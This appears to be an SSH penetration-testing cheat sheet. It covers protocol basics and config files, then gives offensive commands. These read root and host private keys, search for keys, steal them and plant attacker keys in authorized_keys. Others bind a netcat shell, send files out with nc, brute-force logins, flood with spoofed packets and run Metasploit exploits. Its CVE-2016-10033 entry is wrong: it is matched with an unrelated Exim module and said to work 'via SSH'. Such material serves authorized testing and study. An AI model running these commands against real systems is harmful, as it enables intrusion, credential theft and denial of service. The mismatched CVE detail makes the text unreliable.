# P22 SSH

## Index

* \[\[Ports, Protocols, and Services]]

## Secure Shell (SSH)

* **Port Number:** 22
* **Protocol:** TCP
* **Service Name:** Secure Shell (SSH)
* **Defined in:** RFC 4251, RFC 4252, RFC 4253, RFC 4254

SSH (Secure Shell) is a cryptographic network protocol used for secure communication between a client and a server. It provides a secure channel over an unsecured network by encrypting the data exchanged between the two entities. SSH is primarily used for remote login and command execution on networked devices, but it also supports tunneling, forwarding TCP ports, and transferring files.

### Overview of Features

* **Encryption:** SSH uses strong encryption algorithms to protect the confidentiality and integrity of data transmitted between the client and server.
* **Authentication:** Supports multiple authentication methods, including password-based, public key-based, and multi-factor authentication.
* **Port Forwarding:** SSH allows for the forwarding of TCP ports, enabling secure communication between applications that are not directly exposed to the internet.
* **Tunneling:** SSH can tunnel network traffic, providing a secure method to bypass firewalls and secure remote access.
* **SCP and SFTP:** SSH supports secure file transfer via the SCP (Secure Copy) and SFTP (SSH File Transfer Protocol) protocols.
* **Session Management:** SSH provides session management features such as session multiplexing, where multiple SSH sessions can be managed over a single TCP connection.
* **Compression:** SSH can compress the data it transmits, reducing the amount of bandwidth used.

### Typical Use Cases

* **Remote Administration:** SSH is widely used by system administrators to securely manage servers and network devices.
* **Secure File Transfer:** SCP and SFTP are used to securely transfer files between computers.
* **Secure Tunneling:** SSH is used to tunnel traffic securely between networks, providing access to internal services from remote locations.
* **Git Repositories:** Developers often use SSH to securely interact with Git repositories hosted on remote servers.
* **Automation:** SSH is frequently used in scripts to automate tasks on remote systems, particularly in the context of DevOps and CI/CD pipelines.

### How SSH Protocol Works

1. **Session Initialization:**
   * **Step 1:** The client initiates a TCP connection to the SSH server on port 22.
   * **Step 2:** The server responds with its SSH protocol version and software version. The client does the same.
   * **Step 3:** The server and client negotiate a set of encryption algorithms (ciphers), MAC (Message Authentication Code) algorithms, and compression methods to use for the session.
2. **Key Exchange:**
   * **Step 4:** The client and server perform a key exchange using the agreed-upon algorithm (e.g., Diffie-Hellman). This exchange securely establishes a shared secret key that will be used for encrypting the session.
   * **Step 5:** The server sends its public host key to the client. The client uses this key to verify the server's identity and to prevent man-in-the-middle attacks.
3. **Authentication:**
   * **Step 6:** The client initiates the authentication process. Depending on the configuration, this could involve password authentication, public key authentication, or a combination of methods.
   * **Step 7:** If using public key authentication, the client sends its public key to the server. The server checks this key against the list of authorized keys and, if found, challenges the client to prove possession of the corresponding private key.
   * **Step 8:** The client responds with the appropriate signature, proving its identity. If successful, the server grants access.
4. **Session Establishment:**
   * **Step 9:** Once authenticated, the client can initiate a session, requesting either a remote command execution, a terminal session, or file transfer. The session data is encrypted and secured using the previously established encryption methods.
5. **Data Transmission:**
   * **Step 10:** The client and server exchange data over the secure connection. This could include commands, responses, file transfers, etc.
   * **Step 11:** The data is encrypted, integrity-checked using MACs, and optionally compressed before transmission.
6. **Session Termination:**
   * **Step 12:** The client or server may terminate the session by sending an SSH\_MSG\_DISCONNECT message. The TCP connection is then closed.

#### Diagram (Hypothetical Example)

* **Client:** `<attack_ip>` connects to `<target_ip>`:22 using SSH.
* **Server:** `<target_ip>` authenticates `<attack_ip>` and allows secure access to the shell.
* **Client:** `<attack_ip>` issues commands, transfers files, or establishes tunnels securely.

## Additional Information

### Subcategories of SSH

* **OpenSSH:** The most common SSH implementation, available by default on many Unix-based systems.
* **PuTTY:** A popular SSH client for Windows, providing a graphical interface for SSH connections.
* **libssh:** A C library that provides a modern API for SSH connections.

### File Structure and Configurations

* **SSH Configuration Files:**
  * **Server Configuration:** `/etc/ssh/sshd_config`
    * **Port:** Defines the port on which the SSH server listens (default: 22).
    * **PermitRootLogin:** Controls whether root login is allowed. Commonly set to `no` for security reasons.
    * **PasswordAuthentication:** Enables or disables password-based authentication.
    * **PubkeyAuthentication:** Enables or disables public key-based authentication.
    * **AllowUsers:** Specifies which users are allowed to log in via SSH.
    * **PermitEmptyPasswords:** Determines whether empty passwords are allowed (default: no).
    * **ChallengeResponseAuthentication:** Enables or disables challenge-response authentication.
    * **Subsystem:** Defines subsystems such as `sftp` that can be used in the session.
  * **Client Configuration:** `/etc/ssh/ssh_config` (global), `~/.ssh/config` (user-specific)
    * **Host:** Specifies the host alias or pattern to match.
    * **Port:** Defines the port to use when connecting to the SSH server.
    * **IdentityFile:** Specifies the private key file to use for public key authentication.
    * **User:** Specifies the default username to use when connecting.
    * **ForwardAgent:** Enables SSH agent forwarding, which allows the use of local SSH keys on a remote system.
    * **ProxyCommand:** Allows the use of a command to connect to the server, useful for tunneling through intermediate hosts.
* **SSH Key Files:**
  * **Private Keys:** Stored in `~/.ssh/id_rsa`, `~/.ssh/id_ecdsa`, `~/.ssh/id_ed25519`, etc., depending on the key type.
  * **Public Keys:** Stored in `~/.ssh/id_rsa.pub`, `~/.ssh/id_ecdsa.pub`, `~/.ssh/id_ed25519.pub`, etc.
  * **Authorized Keys:** Stored in `~/.ssh/authorized_keys` on the server, containing public keys allowed for login.
  * **Known Hosts:** Stored in `~/.ssh/known_hosts`, containing public keys of previously connected servers to prevent MITM attacks.

### Advanced Options

* **X11 Forwarding:** SSH can forward X11 graphical interfaces from a remote server to the client, allowing remote GUI applications to run locally.
* **Agent Forwarding:** Allows SSH keys stored on the client machine to be used on a remote machine without transferring the private key.
* **ProxyJump:** A modern alternative to `ProxyCommand`, allowing easy SSH connections through intermediary hosts.
* **Host Key Checking:** Ensures that the client verifies the server’s public key against a known list to prevent MITM attacks.

### Modes of Operation

* **Interactive Mode:** SSH sessions can be used interactively, providing a remote shell or executing commands directly.
* **Batch Mode:** SSH can be used in scripts and automated tasks, often with key-based authentication to avoid password prompts.
* **Subsystem Mode:** SSH supports subsystems like `sftp`, enabling file transfers and other extended functionalities within an SSH session.

### Configuration Files

1. **Server Configuration (`sshd_config`):**

* **File Location:** `/etc/ssh/sshd_config`
* **Configuration Example:**

```bash
Port 22
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AllowUsers <username>
X11Forwarding yes
PermitTunnel yes
```

* **Key Settings:**
  * `Port`: Specifies the port the SSH daemon listens on.
  * `PermitRootLogin`: Controls whether the root user can log in via SSH.
  * `PasswordAuthentication`: Enables or disables password-based authentication.
  * `PubkeyAuthentication`: Enables or disables public key authentication.
  * `AllowUsers`: Restricts SSH access to specific users.
  * `X11Forwarding`: Enables or disables X11 forwarding.
  * `PermitTunnel`: Allows or disallows tunneling.

2. **Client Configuration (`ssh_config`):**

* **File Location:** `~/.ssh/config`
* **Configuration Example:**

```bash
Host <target_ip>
    User <username>
    IdentityFile ~/.ssh/id_rsa
    Port 22
    ForwardAgent yes
    Compression yes
```

* **Key Settings:**
  * `User`: Specifies the default username for connections.
  * `IdentityFile`: Specifies the private key to use for authentication.
  * `Port`: Defines the port to connect to (default is 22).
  * `ForwardAgent`: Enables SSH agent forwarding.
  * `Compression`: Enables data compression during the session.

#### SSH Key Files

* **Private Keys:**
  * **Location:** `~/.ssh/id_rsa`, `~/.ssh/id_ecdsa`, `~/.ssh/id_ed25519`
  * **Description:** The private keys used for public key authentication.
* **Public Keys:**
  * **Location:** `~/.ssh/id_rsa.pub`, `~/.ssh/id_ecdsa.pub`, `~/.ssh/id_ed25519.pub`
  * **Description:** The corresponding public keys.
* **Authorized Keys:**
  * **Location:** `~/.ssh/authorized_keys`
  * **Description:** A file on the server listing public keys allowed to log in.
* **Known Hosts:**
  * **Location:** `~/.ssh/known_hosts`
  * **Description:** Stores the public keys of servers the client has connected to.
* **Other Locations**
  * `/home/*`
  * `cat /root/.ssh/authorized\_keys`
  * `cat /root/.ssh/identity.pub`
  * `cat /root/.ssh/identity`
  * `cat /root/.ssh/id\_rsa.pub`
  * `cat /root/.ssh/id\_rsa`
  * `cat /root/.ssh/id\_dsa.pub`
  * `cat /root/.ssh/id\_dsa`
  * `cat /etc/ssh/ssh\_config`
  * `cat /etc/ssh/sshd\_config`
  * `cat /etc/ssh/ssh\_host\_dsa\_key.pub`
  * `cat /etc/ssh/ssh\_host\_dsa\_key`
  * `cat /etc/ssh/ssh\_host\_rsa\_key.pub`
  * `cat /etc/ssh/ssh\_host\_rsa\_key`
  * `cat /etc/ssh/ssh\_host\_key.pub`
  * `cat /etc/ssh/ssh\_host\_key`
  * `cat ~/.ssh/authorized\_keys`
  * `cat ~/.ssh/identity.pub`
  * `cat ~/.ssh/identity`
  * `cat ~/.ssh/id\_rsa.pub`
  * `cat ~/.ssh/id\_rsa`
  * `cat ~/.ssh/id\_dsa.pub`
  * `cat ~/.ssh/id\_dsa`

### Potential Misconfigurations

1. **Weak Authentication Settings:**
   * **Risk:** Allowing password authentication or root login can lead to brute-force attacks and unauthorized access.
   * **Exploitation:** Attackers can use tools like Hydra or Medusa to brute-force passwords, gaining access to the system.
   * **Mitigation:** Disable password authentication and root login. Use key-based authentication instead.
2. **Unrestricted Access:**
   * **Risk:** Not restricting which users can log in via SSH can lead to unauthorized access by lesser-privileged accounts.
   * **Exploitation:** Attackers might exploit vulnerabilities in software running under these accounts or escalate privileges.
   * **Mitigation:** Use the `AllowUsers` directive to restrict SSH access to specific users.
3. **Unmonitored SSH Access:**
   * **Risk:** Failing to monitor SSH access can lead to unnoticed breaches or malicious activity.
   * **Exploitation:** Attackers can maintain persistent access without detection.
   * **Mitigation:** Monitor SSH logs, use fail2ban to block suspicious IPs, and enable 2FA for added security.
4. **Improper Key Management:**
   * **Risk:** Mismanagement of SSH keys, such as leaving them unsecured or using weak passphrases, can lead to unauthorized access.
   * **Exploitation:** Stolen or weak keys can be used to gain access to the server.
   * **Mitigation:** Store keys securely, use strong passphrases, and regularly rotate keys.

### Default Credentials

SSH does not have "default" credentials per se, as it relies on the underlying system’s user accounts. However, if password authentication is enabled and weak or default passwords are used, this could lead to vulnerabilities.

## Interaction and Tools

### Tools

#### \[\[SSH]]

*   **SSH Connect:** Connect to SSH with username and password.

    ```bash
    ssh <username>@<target_ip> -p <target_port>
    ```
*   **SSH Connect with SSH Key:** Uses a specific private key for authentication.

    ```bash
    ssh -i ~/.ssh/id_rsa <username>@<target_ip> -p <target_port>
    ```
*   **SSH Key Generation:** Generates a new RSA key pair for SSH authentication.

    ```bash
    ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
    ```
*   **Upload File to Target Server (SCP):** Copies `file.txt` to the remote server under `/path/to/destination/`.

    ```bash
    scp -P <target_port> file.txt <username>@<target_ip>:/path/to/destination/
    ```
*   **Secure File Transfer (SFTP):** Starts an SFTP session for secure file transfer.

    ```bash
    sftp -P <target_port> <username>@<target_ip>
    ```
*   **Run Command on Remote Server:** Runs the specified `command` on the remote server and returns the output to the local terminal.

    ```bash
    ssh <username>@<target_ip> -p <target_port> -t <command> <command_arguments>
    ```

#### \[\[SSHFS]]

*   **Mount Remote Directory via SSH:** Mounting and interacting with remote filesystems as if they were local.

    ```bash
    sshfs <username>@<target_ip>:/remote/dir /local/mountpoint
    ```

#### \[\[PuTTY]]

#### \[\[WinSCP]]

#### \[\[FileZilla]]

#### tmux/Screen

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "tcp port 22"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p 22
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 22
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 22 -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> 22
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> 22 < secret_data.txt
    ```

#### \[\[SoCat Cheat Sheet]]

*   **Socat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:22
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send UDP Packet:** Send a single UDP packet to the service.

    ```bash
    hping3 -2 <target_ip> -p 22 -c 1
    ```

#### \[\[SSH-Audit]]

*   **Target Scan:** Auditing SSH server security and compliance with best practices.

    ```bash
    ssh-audit <target_ip>
    ```

### Other Techniques

#### Change Authentication Method

*   **Description:** For potential brute-force attacks, we can specify the authentication method with the SSH client option `PreferredAuthentications`.

    ```bash
    ssh -v <username>@<target_ip> -o PreferredAuthentications=password
    ```

#### Search for Files Containing SSH Keys

*   **Description:** Uses Linux-based command grep to search the file system for key terms.

    ```bash
    grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
    ```

    ```bash
    grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
    ```

    ```bash
    grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
    grep -ir "--BEGIN RSA PRIVATE KEY--" /home/*
    grep -ir "BEGIN DSA PRIVATE KEY" /home/*
    grep -ir "BEGIN RSA PRIVATE KEY" /*
    grep -ir "BEGIN DSA PRIVATE KEY" /*
    ```

#### Identify The Host the Key is For

* **Description:** If you find a key you then need to identify what server the key is for. In an attempt to identify what host the key is for the following locations should be checked:
  * `/etc/hosts`
  * `~/.known_hosts`
  * `~/.bash_history`
  * `~/.ssh/config`

## Penetration Testing Techniques

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 22
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 22
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

### Initial Access

#### Cracking SSH Passphrase Keys

*   **Tool:** \[\[John the Ripper Cheat Sheet]]

    ```bash
    python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash-john

    john –wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash-john
    ```

#### Exploiting Weak Configurations

*   **Tool:** \[\[Metasploit]], \[\[Custom Scripts]]

    ```bash
    use auxiliary/scanner/ssh/ssh_login
    set RHOSTS <target_ip>
    set USERNAME <username>
    set PASS_FILE <password_list>
    run
    ```
* **Description:** Exploits weak SSH configurations, such as allowing root login or using weak ciphers.

### Persistence

#### Stealing Legitimate SSH Keys

*   **Tool:** \[\[SSH]]

    1. Create a file named `id_rsa` locally on Attack.

    ```bash
    vim id_rsa
    ```

    2. Copy contents of original `id_rsa` found on Target to `id_rsa` on Attack.

    ```bash
    echo "<target_id_rsa>" >> ~/id_rsa
    ```

    3. Change permissions of `id_rsa` on Attack.

    ```bash
    chmod 600 id_rsa
    ```

    Note: The command `chmod 600 id_rsa` is used on the key after it's been created on the machine to change the file's permissions to be more restrictive. If ssh keys have weak permissions, i.e., maybe read by other people, the ssh server may prevent them from working.

    4. **Connect:** Connect with `id_rsa` on Attack.

    ```bash
    ssh user@10.10.10.10 -i id_rsa
    ```
* **Description:** If we have read access over the .ssh directory for a specific user, we may read their private ssh keys found in `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`, and use it to log in to the server. If we can read the `/root/.ssh/` directory and can read the `id_rsa` file, we can copy it to our machine and use the `-i` flag to log in with it:

#### Adding Malicious SSH Keys

*   **Tool:** \[\[SSH]]

    1. Create new key pair. This will give generate two files: `key` (which will be used with `ssh -i`) and `key.pub`, which we will be copied to the remote machine.

    ```bash
    ssh-keygen -f key
    ```

    2. Transfer `key.pub` to target.
    3. Add `key.pub` into `/root/.ssh/authorized_keys`. The remote server should allow the use of the newly added `key.pub` to log in as that user with the associated private key.

    ```bash
    echo "<attacker_public_key>" >> ~/.ssh/authorized_keys
    ```

    4. **Connect:** Connect with `id_rsa` on Attack.

    ```bash
    ssh user@10.10.10.10 -i id_rsa
    ```
*   **Description:** Inserts the attacker’s public key into the `authorized_keys` file, allowing persistent access without needing a password.

    ```
       While you have access to the compromised host and we find ourselves with write access to a user's `/.ssh/` directory, it is typically a good idea to backdoor the SSH `authorized_keys` file which will allow for passwordless login at a point in the future. This should provide an easier and more reliable connection than exploiting and accessing via a reverse shell; and potentially reduce the risk of detection.

      Adding the key is simply a case of paste a SSH public key, generated on your attacking machine and pasting it into the `~/ssh/authorized_keys` file on the compromised machine. This technique is usually used to gain ssh access after gaining a shell as that user. Some SSH configurations may not accept keys written by other users, so it will only work if we have already gained control over that user. We must first create a new key with ssh-keygen and the `-f` flag to specify the output file.
    ```

#### Backdoor with SSH

*   **Tool:** \[\[SSH]], \[\[Custom Scripts]]

    ```bash
    nc -l -p 22 -e /bin/sh
    ```
* **Description:** Set up a backdoor that binds a shell to port 22, allowing the attacker to regain access.

### Credential Harvesting

#### SSH Key Harvesting

*   **Tool:** \[\[Custom Scripts]], \[\[SSH]]

    ```bash
    cp ~/.ssh/id_rsa /tmp/attacker_id_rsa
    ```
* **Description:** Copies SSH private keys from the target to a location accessible by the attacker, allowing them to authenticate to other systems.

#### SSH Agent Hijacking

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    SSH_AUTH_SOCK=/tmp/ssh-socket ssh-add -L
    ```
* **Description:** Hijacks the SSH agent’s socket to list and use keys loaded into the SSH agent on the victim’s machine.

### Privilege Escalation

#### Escalation via Sudo Misconfiguration

*   **Tool:** \[\[SSH]], Sudo

    ```bash
    ssh <username>@<target_ip> "sudo <command>"
    ```
* **Description:** If a user has sudo privileges without requiring a password, escalate privileges by executing commands as root.

#### Privilege Escalation via Key Injection

*   **Tool:** \[\[SSH]], \[\[Custom Scripts]]

    ```bash
    echo "<attacker_public_key>" >> /root/.ssh/authorized_keys
    ```
* **Description:** Injects an attacker’s key into the root’s authorized keys, allowing them to log in as root via SSH.

### Internal Reconnaissance

#### Mapping the Network

*   **Tool:** \[\[SSH]], \[\[Nmap]]

    ```bash
    ssh <username>@<target_ip> "nmap -sP 192.168.1.0/24"
    ```
* **Description:** Uses SSH to run network discovery commands on the internal network, mapping out live hosts.

#### Enumerating Users

*   **Tool:** \[\[SSH]], \[\[Custom Scripts]]

    ```bash
    ssh <username>@<target_ip> "cat /etc/passwd"
    ```
* **Description:** Enumerates user accounts on the target system, identifying potential targets for further exploitation.

### Lateral Movement, Pivoting, and Tunnelling

#### Local Port Forwarding

*   **Tool:** \[\[SSH]]

    ```bash
    ssh -L <local_port>:<destination_ip>:<destination_port> <username>@<target_ip>
    ```
* **Description:** Forwards traffic from `<local_port>` on the client to `<destination_ip>:<destination_port>` on the server.

#### Remote Port Forwarding

*   **Tool:** \[\[SSH]]

    ```bash
    ssh -R <remote_port>:<destination_ip>:<destination_port> <username>@<target_ip>
    ```
* **Description:** Forwards traffic from `<remote_port>` on the server to `<destination_ip>:<destination_port>` on the client.

#### Dynamic Port Forwarding (SOCKS Proxy)

*   **Tool:** \[\[SSH]]

    ```bash
    ssh -D <local_port> <username>@<target_ip>
    ```
*   **Description:** Creates a SOCKS proxy on `<local_port>` on the client, routing traffic through the SSH server.

    ```
    Note: This is only possible to perform if the remote target has the `AllowTcpForwarding` option be enabled in the server’s configuration file, which is often the default. If the option is disabled or the more specific `PermitOpen` option does not allow the connection to be made, the connection will fail with the administratively prohibited error. 
    ```

#### SSH Agent Forwarding

*   **Tool:** \[\[SSH]]

    ```bash
    ssh -A <username>@<target_ip>
    ```
* **Description:** Enables the use of the client’s SSH keys on the remote server, without transferring the keys.

#### ProxyJump

*   **Tool:** \[\[SSH]]

    ```bash
    ssh -J <jump_host> <username>@<target_ip>
    ```
* **Description:** Connects to `<target_ip>` via the intermediate `<jump_host>`, simplifying multi-hop SSH connections.

### Defense Evasion

#### Hiding SSH Connections

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    ssh <username>@<target_ip> -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"
    ```
* **Description:** Avoids detection by skipping SSH host key checks and not recording the connection in `known_hosts`.

#### Using Non-Standard Ports

*   **Tool:** \[\[SSH]], Custom Configurations

    ```bash
    ssh <username>@<target_ip> -p <non_standard_port>
    ```
* **Description:** Connects to SSH using a non-standard port to avoid detection by security tools monitoring port 22.

### Data Exfiltration

#### Using SCP for Data Exfiltration

*   **Tool:** \[\[SCP]]

    ```bash
    scp -P <target_port> <username>@<target_ip>:/path/to/file.txt /local/destination/
    ```
* **Description:** Securely transfers sensitive data from the target to the attacker’s machine using SCP.

#### SFTP for Covert File Transfers

*   **Tool:** \[\[SFTP]]

    ```bash
    sftp -P <target_port> <username>@<target_ip>
    ```
* **Description:** Uses SFTP to covertly transfer files, bypassing traditional file transfer monitoring tools.

## Exploits and Attacks

### Password Attacks

#### Password Brute Force

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra ssh://<target_ip> -s 22 -l <username> -P <password_list>
    ```
* **Description:** Test a single username against multiple passwords.

#### Password Spray

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra ssh://<target_ip> -s 22 -l <username_list> -P <password>
    ```
* **Description:** Test a multiple usernames against a single password.

#### Offline Hash Cracking

*   **Tool:** \[\[John the Ripper Cheat Sheet]]

    ```bash
    john --wordlist=<path/to/wordlist> <hash_file>
    ```

\


*   **Tool:**

    ```bash
    hashcat -m <mode> <hash_file> <path/to/wordlist>
    ```

### Denial of Service

**TCP/UPD Flood Attack**

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

#### SSH `MaxAuthTries` Exhaustion

*   **Tool:** \[\[SSH]], \[\[Custom Scripts]]

    ```bash
    while true; do ssh <username>@<target_ip>; done
    ```
* **Description:** Exhausts the allowed authentication attempts, potentially causing the SSH service to lock out legitimate users.

### Exploits

### CVE-2018-15473

*   **Tool:** \[\[Metasploit]], \[\[Custom Scripts]]

    ```bash
    use auxiliary/scanner/ssh/ssh_enumusers
    set RHOSTS <target_ip>
    set USER_FILE <user_list>
    run
    ```
* **Description:** An enumeration vulnerability in OpenSSH that allows attackers to check if a username is valid on the server.

\


*   **Tool:** \[\[ssh\_enum]]

    ```bash
    python3 ssh_enum.py <target_ip> -p 22
    ```
* **Description:** An enumeration vulnerability in OpenSSH that allows attackers to check if a username is valid on the server.

### CVE-2016-10033

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/unix/smtp/exim4_string_format
    set RHOSTS <target_ip>
    set USERNAME <username>
    set PAYLOAD cmd/unix/reverse
    run
    ```
* **Description:** Exploits a vulnerability in Exim (a popular mail transfer agent) when running as root to execute arbitrary commands via SSH.

## Resources

| **Website**            | **URL**                                              |
| ---------------------- | ---------------------------------------------------- |
| RFC 4251               | https://tools.ietf.org/html/rfc4251                  |
| RFC 4252               | https://tools.ietf.org/html/rfc4252                  |
| RFC 4253               | https://tools.ietf.org/html/rfc4253                  |
| RFC 4254               | https://tools.ietf.org/html/rfc4254                  |
| OpenSSH Manual         | https://man.openbsd.org/ssh                          |
| PuTTY Documentation    | https://www.chiark.greenend.org.uk/\~sgtatham/putty/ |
| Metasploit Framework   | https://www.metasploit.com/                          |
| Hydra Documentation    | https://github.com/vanhauser-thc/thc-hydra           |
| Wireshark SSH Analysis | https://wiki.wireshark.org/SSH                       |
| SSH Audit Tool         | https://github.com/arthepsy/ssh-audit                |
